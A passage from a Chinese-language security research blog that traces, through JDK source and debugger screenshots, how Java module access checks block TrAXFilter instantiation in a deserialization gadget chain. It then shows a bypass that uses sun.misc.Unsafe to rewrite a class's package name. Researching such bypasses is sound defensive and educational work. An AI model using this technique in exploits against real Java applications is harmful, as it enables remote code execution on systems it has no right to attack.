+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> clazz.getDeclaredConstructors()[<span class="number">0</span>].newInstance(TemplatesUtil.getTemplates());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里选 TrAXFilter 去实例化是因为我们的链子在反序列化时调用 newInstance 的就是 TrAXFilter 类</p>
+<p>点进 newInstance 下个断点，然后开跟</p>
+<p>跟到 <code>java.lang.reflect.Constructor#newInstanceWithCaller</code>看上去有点检测的感觉：</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 创建一个新的实例，支持调用者检查和访问控制</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> args 构造函数参数数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> checkAccess 是否检查访问权限</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> caller 调用者类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 新创建的实例</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InstantiationException 当实例化失败时抛出</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalAccessException 当访问被拒绝时抛出</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InvocationTargetException 当构造函数调用抛出异常时抛出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/* package-private */</span></span><br><span class="line">T <span class="title function_">newInstanceWithCaller</span><span class="params">(Object[] args, <span class="type">boolean</span> checkAccess, Class&lt;?&gt; caller)</span></span><br><span class="line">    <span class="keyword">throws</span> InstantiationException, IllegalAccessException,</span><br><span class="line">           InvocationTargetException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 检查访问权限</span></span><br><span class="line">    <span class="keyword">if</span> (checkAccess)</span><br><span class="line">        checkAccess(caller, clazz, clazz, modifiers);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查是否为枚举类型，枚举类型不能通过反射创建</span></span><br><span class="line">    <span class="keyword">if</span> ((clazz.getModifiers() &amp; Modifier.ENUM) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Cannot reflectively create enum objects&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取构造函数访问器</span></span><br><span class="line">    <span class="type">ConstructorAccessor</span> <span class="variable">ca</span> <span class="operator">=</span> constructorAccessor;   <span class="comment">// read volatile</span></span><br><span class="line">    <span class="keyword">if</span> (ca == <span class="literal">null</span>) &#123;</span><br><span class="line">        ca = acquireConstructorAccessor();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建新实例</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    <span class="type">T</span> <span class="variable">inst</span> <span class="operator">=</span> (T) ca.newInstance(args);</span><br><span class="line">    <span class="keyword">return</span> inst;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>检查完访问权限后，才会创建新的实例，在 checkAccess 这一句后面下断点，然后恢复运行，发现没有在下一句断下来就抛出异常了，所以肯定是 checkAccess 里面遇到了问题</p>
+<p>跟进 checkAccess：</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 检查访问权限，验证调用者是否有权限访问指定的成员</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> caller 调用者类，表示发起访问的类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> memberClass 成员类，表示包含被访问成员的类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> targetClass 目标类，表示实际要访问的类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> modifiers 访问修饰符，表示被访问成员的访问权限标志</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalAccessException 当访问权限验证失败时抛出此异常</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">checkAccess</span><span class="params">(Class&lt;?&gt; caller, Class&lt;?&gt; memberClass,</span></span><br><span class="line"><span class="params">                       Class&lt;?&gt; targetClass, <span class="type">int</span> modifiers)</span></span><br><span class="line">    <span class="keyword">throws</span> IllegalAccessException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 验证访问权限，如果验证失败则抛出异常</span></span><br><span class="line">    <span class="keyword">if</span> (!verifyAccess(caller, memberClass, targetClass, modifiers)) &#123;</span><br><span class="line">        <span class="type">IllegalAccessException</span> <span class="variable">e</span> <span class="operator">=</span> Reflection.newIllegalAccessException(</span><br><span class="line">            caller, memberClass, targetClass, modifiers);</span><br><span class="line">        <span class="comment">// 根据配置决定是否打印异常堆栈信息</span></span><br><span class="line">        <span class="keyword">if</span> (printStackTraceWhenAccessFails()) &#123;</span><br><span class="line">            e.printStackTrace(System.err);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>可以看到 verifyAccess 返回为 false，导致抛出异常：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756974831626-7ddcf10b-259a-4ff7-b019-fe0d2790ed46.png"
+                     
+                ></p>
+<p>所以关键就是看看怎么让 verifyAccess 返回 true，继续跟进：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756975216243-0f0aaa39-92e7-4bf1-87bd-ae084b9395f6.png"
+                     
+                ></p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 验证调用者类对目标成员的访问权限</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> caller 调用者类，即尝试访问成员的类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> memberClass 成员所属的类，即定义该成员的类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> targetClass 目标类，对于实例成员或构造器来说是实际的目标类，否则为null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> modifiers 成员的访问修饰符（如public、private、protected等）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 如果调用者有权限访问该成员则返回true，否则返回false</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">verifyAccess</span><span class="params">(Class&lt;?&gt; caller, Class&lt;?&gt; memberClass,</span></span><br><span class="line"><span class="params">                           Class&lt;?&gt; targetClass, <span class="type">int</span> modifiers)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 快速检查：如果调用者类就是成员所属类（即本类调用），则直接允许访问</span></span><br><span class="line">    <span class="keyword">if</span> (caller == memberClass) &#123;  <span class="comment">// quick check</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;             <span class="comment">// ACCESS IS OK</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 检查受保护成员的访问权限</span></span><br><span class="line">    <span class="keyword">if</span> (targetClass != <span class="literal">null</span> <span class="comment">// instance member or constructor</span></span><br><span class="line">        &amp;&amp; Modifier.isProtected(modifiers)</span><br><span class="line">        &amp;&amp; targetClass != memberClass) &#123;</span><br><span class="line">        <span class="comment">// 对于受保护的实例成员，检查调用者是否在目标类的访问检查范围内</span></span><br><span class="line">        <span class="keyword">if</span> (isAccessChecked(caller, targetClass)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;         <span class="comment">// ACCESS IS OK</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">// 检查非受保护成员或其他情况的访问权限</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (isAccessChecked(caller)) &#123;</span><br><span class="line">        <span class="comment">// Non-protected case (or targetClass == memberClass or static member).</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;             <span class="comment">// ACCESS IS OK</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果上述快速检查都无法确定访问权限，则使用慢速路径进行详细验证</span></span><br><span class="line">    <span class="keyword">return</span> slowVerifyAccess(caller, memberClass, targetClass, modifiers);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>可以看到很多地方都可以返回 true</p>
+<p><strong>第一个判断</strong>：</p>
+<p>调用者的 class 对象 &#x3D;&#x3D; 被反射的类成员的 class 对象，可以理解为本类反射调用，如果满足这个条件的话肯定就返回 true 了，很好理解，但是我们肯定不满足。</p>
+<p>这里没有进行非空判断就直接先判断这个条件，应该也是为了性能考虑，希望处理速度更快（从注释的 quick check 也可以看出来）</p>
+<p><strong>第二个判断</strong>：</p>
+<p>这里有三个条件，先看第一个非空，这个肯定满足</p>
+<p>再看 Modifier.isProtected(modifiers) ，意思是我们访问的是一个 Protected 的方法或者变量</p>
+<p>这个就是 false 了，我们没法改变，直接去看 else if：</p>
+<p><strong>第三个判断</strong>：</p>
+<p>跟进 isAccessChecked：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1757067456484-a8fcbd48-0fe5-4016-922b-d49a7adca9eb.png"
+                     
+                ></p>
+<p>这里的逻辑是从缓存里找我们的调用类，但是能够看到我们的 accessCheckCache 为 null，肯定是找不到的，所以这里也不通</p>
+<p>刚才的条件都没法满足，继续跟进 slowVerifyAccess：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756978182354-f3f321d9-8b76-4b94-ad02-afcf7a0d08fe.png"
+                     
+                ></p>
+<p>可以看到就是在 verifyMemberAccess 里面返回 false 导致这个函数返回了false，继续跟进：</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Verify access to a member and return &#123;<span class="doctag">@code</span> true&#125; if it is granted.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> currentClass the class performing the access</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> memberClass the declaring class of the member being accessed</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> targetClass the class of target object if accessing instance</span></span><br><span class="line"><span class="comment"> *                    field or method;</span></span><br><span class="line"><span class="comment"> *                    or the declaring class if accessing constructor;</span></span><br><span class="line"><span class="comment"> *                    or null if accessing static field or method</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> modifiers the member&#x27;s access modifiers</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> &#123;<span class="doctag">@code</span> true&#125; if access to member is granted</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">verifyMemberAccess</span><span class="params">(Class&lt;?&gt; currentClass,</span></span><br><span class="line"><span class="params">                                         Class&lt;?&gt; memberClass,</span></span><br><span class="line"><span class="params">                                         Class&lt;?&gt; targetClass,</span></span><br><span class="line"><span class="params">                                         <span class="type">int</span> modifiers)</span></span><br><span class="line">&#123;</span><br><span class="line">    Objects.requireNonNull(currentClass);</span><br><span class="line">    Objects.requireNonNull(memberClass);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果当前类就是成员所在的类，则总是允许访问</span></span><br><span class="line">    <span class="keyword">if</span> (currentClass == memberClass) &#123;</span><br><span class="line">        <span class="comment">// Always succeeds</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 验证模块访问权限</span></span><br><span class="line">    <span class="keyword">if</span> (!verifyModuleAccess(currentClass.getModule(), memberClass)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">gotIsSameClassPackage</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">isSameClassPackage</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查成员类是否具有公共访问权限，如果不是，则检查是否在同一包内</span></span><br><span class="line">    <span class="keyword">if</span> (!Modifier.isPublic(getClassAccessFlags(memberClass))) &#123;</span><br><span class="line">        isSameClassPackage = isSameClassPackage(currentClass, memberClass);</span><br><span class="line">        gotIsSameClassPackage = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (!isSameClassPackage) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 此时已知 currentClass 可以访问 memberClass</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果成员是 public 的，则允许访问</span></span><br><span class="line">    <span class="keyword">if</span> (Modifier.isPublic(modifiers)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果成员是 private 的，检查是否为嵌套成员（nestmate）</span></span><br><span class="line">    <span class="keyword">if</span> (Modifier.isPrivate(modifiers)) &#123;</span><br><span class="line">        <span class="comment">// Note: targetClass may be outside the nest, but that is okay</span></span><br><span class="line">        <span class="comment">//       as long as memberClass is in the nest.</span></span><br><span class="line">        <span class="keyword">if</span> (areNestMates(currentClass, memberClass)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">successSoFar</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果成员是 protected 的，检查 currentClass 是否为 memberClass 的子类</span></span><br><span class="line">    <span class="keyword">if</span> (Modifier.isProtected(modifiers)) &#123;</span><br><span class="line">        <span class="comment">// See if currentClass is a subclass of memberClass</span></span><br><span class="line">        <span class="keyword">if</span> (isSubclassOf(currentClass, memberClass)) &#123;</span><br><span class="line">            successSoFar = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果尚未成功，并且成员不是 private 的，检查是否在同一包内</span></span><br><span class="line">    <span class="keyword">if</span> (!successSoFar &amp;&amp; !Modifier.isPrivate(modifiers)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!gotIsSameClassPackage) &#123;</span><br><span class="line">            isSameClassPackage = isSameClassPackage(currentClass,</span><br><span class="line">                                                    memberClass);</span><br><span class="line">            gotIsSameClassPackage = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isSameClassPackage) &#123;</span><br><span class="line">            successSoFar = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果仍未成功，则拒绝访问</span></span><br><span class="line">    <span class="keyword">if</span> (!successSoFar) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对于 protected 实例成员和构造函数的额外检查：JLS 6.6.2</span></span><br><span class="line">    <span class="keyword">if</span> (targetClass != <span class="literal">null</span> &amp;&amp; Modifier.isProtected(modifiers) &amp;&amp;</span><br><span class="line">        targetClass != currentClass)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!gotIsSameClassPackage) &#123;</span><br><span class="line">            isSameClassPackage = isSameClassPackage(currentClass, memberClass);</span><br><span class="line">            gotIsSameClassPackage = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果不在同一包内，检查 targetClass 是否为 currentClass 的子类</span></span><br><span class="line">        <span class="keyword">if</span> (!isSameClassPackage) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!isSubclassOf(targetClass, currentClass)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>第一个判断肯定不满足，过</p>
+<p>第二个判断如果过不去的话直接就是 false</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756978631709-7aa417c5-5d0d-4730-9b97-ffec813404ef.png"
+                     
+                ></p>
+<p>而我们刚好就是死在这里，所以这里肯定要想办法绕过，不然一点机会都没了，继续跟：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756978697136-6fdc9ee8-f085-4b21-81cc-9c2158b3c464.png"
+                     
+                ></p>
+<p>这里又是判断当前类的 module 和 被反射的类的 module 是否一样，肯定不满足，看 else：</p>
+<p>这里拿了目标类的包名，然后调用 isExported 方法判断当前包名是否对当前类的 module 开放</p>
+<p>跟进</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756980577892-de2b04c6-70bc-408e-8979-f0015a610848.png"
+                     
+                ></p>
+<p>没逻辑，继续跟：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756981490009-efbe06e5-72ca-45cd-bee1-1c6f18511743.png"
+                     
+                ></p>
+<p><strong>第一个判断</strong>：</p>
+<p>这个<code>isNamed()</code>，这里代码意思是被调用类是非命名模块的话就直接返回<code>true</code></p>
+<p>因为在 Java 9 引入模块系统之后，不是所有的 JAR 文件都变成了命名的模块，非命名模块不受模块检测的限制，</p>
+<p>所以我们把调用类的 Module.name 反射改为 null 就可以</p>
+<p>但其实<code>Module</code>类做了防护，java不会让我们得到这个的类Field。<code>getDeclaredFields()</code>出来都是空的</p>
+<p><strong>第二个判断</strong>：</p>
+<p> other &#x3D;&#x3D; this 依然是判断 Test1 的 Module 和 java.xml 是否一样，满足不了，过</p>
+<p><strong>第三个判断</strong>：</p>
+<p>descriptor.isOpen() 是写死的，满足不了</p>
+<p><strong>第四个判断</strong>： 跟进 isStaticallyExportedOrOpen ：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756981998262-9ac7eacc-f288-4311-90ad-726ca1806c58.png"
+                     
+                ></p>
+<p>openPackages !&#x3D; null 满足不了，看下面</p>
+<p>重点就在于我们能否满足 exportedPackages !&#x3D; null &amp;&amp; allows(exportedPackages.get(pn), other) 了</p>
+<p>前面一半已经满足了：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1757071826409-497d92c0-9616-4201-8f02-5cf0c8dfa98d.png"
+                     
+                ></p>
+<p>现在看 allows(exportedPackages.get(pn), other)</p>
+<p>exportedPackages.get(pn) 是获取包名，我们的结果是 null，跟进 allows</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756982225534-5dad48f5-0982-41dd-8a7e-5ac15b260f3c.png"
+                     
+                ></p>
+<p>首先我们要让 targets 不为 null，也就是 exportedPackages.get(pn) 不为 null，否则直接就返回 false 了</p>
+<p>看一下 exportedPackages.get(pn) ，exportedPackages 是一个 Map，所以我们只要控制 pn 是这个 Map 中存在的键名即可</p>
+<p>找找 exportedPackages 里面有哪些东西：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756982462921-d7604383-a44a-4a8d-8942-173f1295a348.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756984852124-bd4fff3d-810f-494e-9b23-166f7bd71310.png"
+                     
+                ></p>
+<p>我们让 pn 是这些键值中的任意一个就可以了，看一下 pn 是什么：</p>
+<p>一直向上跟（第一个参数就是后面的 pn）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756984963637-2832bdeb-97f5-41c5-9ffd-5c64b7b79d1d.png"
+                     
+                ></p>
+<p>可以看到 pn 就是目标类的包名，我们同样利用 Unsafe 修改即可</p>
+<p>修改完再调回刚才那个地方会发现返回 true 了：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1757074346346-35a4beb8-135b-4246-a481-862735fc34b4.png"
+                     
+                ></p>
+<p>接下来一路返回 true ，回到 verifyMemberAccess，最后也返回了 true</p>
+<p>测试一下，实例化 TrAXFilter：（这里注意，由于是直接实例化 TrAXFilter，所以 templates 中需要对 _tfactory 赋值）</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;</span>);</span><br><span class="line">        UnsafeUtil.patchModule(Test.class);</span><br><span class="line">        Class&lt;?&gt; unsafeClass = Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">theUnsafeField</span> <span class="operator">=</span> unsafeClass.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        theUnsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) theUnsafeField.get(<span class="literal">null</span>);</span><br><span class="line">        unsafe.getAndSetObject(clazz, <span class="number">60</span>, <span class="string">&quot;org.xml.sax&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> clazz.getDeclaredConstructors()[<span class="number">0</span>].newInstance(TemplatesUtil.getTemplates());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>成功触发：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1757073246345-f3fcdb70-0a83-4a3d-96f3-1228b42a6c44.png"
+                     
